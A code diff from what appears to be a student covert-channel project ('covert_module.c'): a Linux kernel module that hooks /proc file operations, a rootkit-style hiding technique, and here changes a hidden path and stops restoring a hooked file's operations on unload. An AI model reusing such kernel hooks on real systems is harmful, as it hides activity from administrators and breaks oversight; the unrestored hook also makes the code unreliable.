@@ -681,7 +681,8 @@ static int __init mod_init(void) {
     proc_inode->i_fop = &proc_fops;
 
     char *user_string = kmalloc(100, GFP_KERNEL);
-    strcpy(user_string, "/aing-matrix");
+    //strcpy(user_string, "/aing-matrix");
+    strcpy(user_string, "/home/john/Documents/BCIT/COMP8505/8505-final/covert_module.c");
     char *user_file = kmalloc(100, GFP_KERNEL);
     memset(user_file, 0, 40);
 
@@ -691,6 +692,11 @@ static int __init mod_init(void) {
         }
         user_file[x++] = user_string[i];
         user_string[i] = '\0';
+    }
+    for (i = 0; i < strlen(user_file) / 2; ++i) {
+        char tmp = user_file[i];
+        user_file[i] = user_file[strlen(user_file) - i - 1];
+        user_file[strlen(user_file) - i - 1] = tmp;
     }
 
     printk(KERN_INFO "Dir \"%s\"\tFile \"%s\"\n", user_string, user_file);
@@ -783,8 +789,8 @@ static void __exit mod_exit(void) {
     proc_inode = proc_path.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fops;
 
-    my_file_inode = my_file_path.dentry->d_inode;
-    my_file_inode->i_fop = backup_file_ops;
+    //my_file_inode = my_file_path.dentry->d_inode;
+    //my_file_inode->i_fop = backup_file_ops;
 
 #if 0
     if (svc) {
